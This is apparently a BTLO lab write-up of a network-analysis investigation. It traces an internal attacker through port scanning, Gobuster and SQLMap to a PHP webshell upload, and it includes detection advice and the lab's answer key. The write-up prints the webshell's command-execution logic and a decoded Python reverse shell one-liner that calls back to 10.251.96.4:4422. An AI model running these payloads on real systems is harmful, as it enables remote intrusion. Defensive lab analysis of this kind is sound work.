# 🛡️ Security Writeup – Webshell

## 📌 Overview

* **Platform:** BTLO
* **Category:** Network Analysis
* **Difficulty:** Easy
* **Date:** 01/04/2026

---

## 📖 Scenario

The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system.

---

## 🎯 Objectives

Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.

---

## 🧰 Tools 

* Tools: Wireshark, VirusTotal

---

## 🧠 Investigation Strategy

### As SOC team send and alert about local to local port scanning, we should create and effective stratefy specify this:
* Identify scan pattern SYN scan for no completed TCP handshake as this is classic sign of reconnaissance
* Verify full connect scan  may confirm open port: UDP, TCP 3 way handshake
* Detect port sweep behaviour: from 1 IP host scan to other ports
* Check successful connection -> if port open -> data may be exchanged -> attacker take advantage
---

## 🔍 Analysis

* Due to the scenario, the SOC team inform us about an IP host scan the internal system. So we have to identify which IP address is malicious or have behaviour of port sweep.

<img width="1634" height="406" alt="image" src="https://github.com/user-attachments/assets/a9853d44-2c44-4b38-bf6e-14c30b3cb5c4" />

<img width="1601" height="524" alt="image" src="https://github.com/user-attachments/assets/0e1c0da4-bf9a-4606-9cc6-fa3b88fdf7f2" />

* Deep dive into the Statistics -> Conversations, we can see that IP host of 10.251.96.4 have conversation with port range from 1 to 1024, which is liky to be an act of port sweep from the hacker
* Focus on the malicious IP address, we realize that the attacker is conducting TCP SYN scan (also known as Half-Open scan). This is a technique used to check if ports are open without fully completing the TCP connection. It s faster than full scan and more stealthy, help it less like to be detected.


<img width="1918" height="865" alt="image" src="https://github.com/user-attachments/assets/3590448f-a167-4ce9-a3b1-46d1f1f30840" />

* Investigating further, it shows that the attacker try to use Gobuster tool to perform reconnaisence against  open port. Gobuster is a directory/file brute-forcing tool used to discover hidden file, directory and subdomain. 
  
<img width="1919" height="899" alt="image" src="https://github.com/user-attachments/assets/91eb845f-ed45-4530-8154-c6195dee84af" />

* Gobuster takes a wordlist and tries each word against a target URL to see what exists and as we can see here, it tries to explore sensitive file like /.passwd, /.config,...

* Take a deeper look at the actions of the hacker, we detect a packet that looks quite suspicious because it contains some words like UNION, AND, SELECT,... like in the SQL

<img width="1919" height="918" alt="image" src="https://github.com/user-attachments/assets/ddf22a6d-c850-492b-b552-9c117d575ac6" />

* And the User-Agent of the packet indicates that the attacker use the SQLMap tool. SQLMap is an automated tool used  to detect and exploit SQL injection vulnerabilities in web applications.

* Have a closer look at the TCP stream of the last packet of HTTP POST which is /upload.php

  <img width="1219" height="766" alt="image" src="https://github.com/user-attachments/assets/04e75f12-626e-4568-b5e5-05ef3acf3c93" />

* The attacker uploaded a web shell  through editprofile.php which is dbfunctions.php as we can see here
* User sends a request to the PHP file with a cmd parameter

The code checks if cmd exists:

isset($_REQUEST['cmd'])

If yes, it stores it in a variable:

$cmd = ($_REQUEST['cmd']);

Then executes it on the server:

system($cmd);
The output is printed to the page ( <pre for formatting)

The script stops:

die;

<img width="1808" height="178" alt="image" src="https://github.com/user-attachments/assets/894d0e7d-9328-4fa5-b19a-9704e35f6ec5" />

* The parameter cmd used in the web shell for executing commands id and whoami.

<img width="1194" height="232" alt="image" src="https://github.com/user-attachments/assets/bc7751e3-8ad2-4cd1-b1de-a5e195836794" />

* The hacker upload a URL-encoded Python reverse shell command.

  #### Decoded version
  
python -c 'import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);

s.connect(("10.251.96.4",4422));

os.dup2(s.fileno(),0);

os.dup2(s.fileno(),1);

os.dup2(s.fileno(),2);

subprocess.call(["/bin/sh","-i"]);'

#### What it does

Create a socket

socket.socket(...)

→ prepares a network connection

Connect to attacker

s.connect(("10.251.96.4",4422))

→ target machine connects back to attacker IP + port

Redirect input/output

os.dup2(...)

→ links terminal (stdin, stdout, stderr) to the socket

Spawn a shell

/bin/sh -i

→ gives attacker an interactive shell

---

### Key Artifact Identification


* Indicator 1: Port scanning behavior against destination ports 1–1024
* Indicator 2: Gobuster User-Agent / directory brute-force requests
* Indicator 3: SQLMap User-Agent and SQL injection payloads
* Indicator 7: Webshell command execution using cmd=id and cmd=whoami
* Indicator 8: Reverse shell callback to 10.251.96.4:4422


---

## 🧾 Key Findings

* The activity is malicious
* The attacker IP 10.251.96.4 conducted a TCP SYN port scan
* After discovering an accessible web service, the attacker used Gobuster for directory enumeration
* The attacker then used SQLMap to test for or exploit SQL injection
* A PHP webshell was uploaded through the web application
* The attacker used the webshell to execute commands such as id and whoami
* A Python reverse shell payload was then deployed to establish remote interactive access

---

## 🗺️ Attack Flow / Timeline

#### 1. Reconnaissance
* Internal host 10.251.96.4 scans another internal system across ports 1–1024
* Scan pattern matches TCP SYN / half-open scan
#### 2. Service Enumeration
* The attacker identifies an open web service
* Gobuster is used to brute-force directories and sensitive files
#### 3. Vulnerability Probing
* HTTP traffic shows SQL-related payloads
* SQLMap is used for automated SQL injection testing
#### 4. Initial Exploitation
* The attacker sends an HTTP POST request to /upload.php
* A PHP webshell is uploaded
#### 5. Command Execution
* The attacker interacts with the webshell using the cmd parameter
* Commands such as id and whoami are executed
#### 6. Post-Exploitation
* A Python reverse shell payload is delivered
* The compromised host connects back to 10.251.96.4:4422
* The attacker gains interactive shell access

---


## 🛡️ Detection Opportunities

* Alert on internal-to-internal port scanning, especially high-volume scans across sequential ports
* Detect TCP SYN scan patterns with incomplete handshakes
* Monitor HTTP User-Agent strings associated with offensive tools such as:
  
Gobuster

SQLMap
* Alert on access attempts to sensitive paths like:
  
/.passwd

/.config

hidden files and backup files

* Monitor for suspicious file upload activity, especially uploads of .php files
* Detect web requests containing parameters used for command execution, such as:
  
cmd=

* Look for reverse shell indicators, including:
  
outbound connections to unusual internal IPs and ports

Python processes spawning /bin/sh

---



## 💡 Lessons Learned

* Port scanning is often the first visible sign of a broader compromise
* Web enumeration and SQL injection testing can quickly lead to full system compromise if web applications are not secured
* File upload functionality is a high-risk attack surface and must be tightly controlled
* Detecting post-exploitation behavior such as webshell usage and reverse shells is critical for rapid containment

---

## ❓ Answers

| Question | Answer |
| -------- | ------ |
| Q1: What is the IP responsible for conducting the port scan activity?       | 10.251.96.4    |
| Q2: What is the port range scanned by the suspicious host?      | 1-1024    |
| Q3: What is the type of port scan conducted?      | TCP SYN    |
| Q4: Two more tools were used to perform reconnaissance against open ports, what were they?      | Gobuster 3.0.1, sqlmap 1.4.7    |
| Q5: What is the name of the php file through which the attacker uploaded a web shell?     | Editprofile.php    |
| Q6: What is the name of the web shell that the attacker uploaded?      | Dbfunctions.php    |
| Q7: What is the parameter used in the web shell for executing commands?       | cmd    |
| Q8: What is the first command executed by the attacker?       | id    |
| Q9: What is the type of shell connection the attacker obtains through command execution?      | reverse    |
| Q10: What is the port he uses for the shell connection?      | 4422    |

---

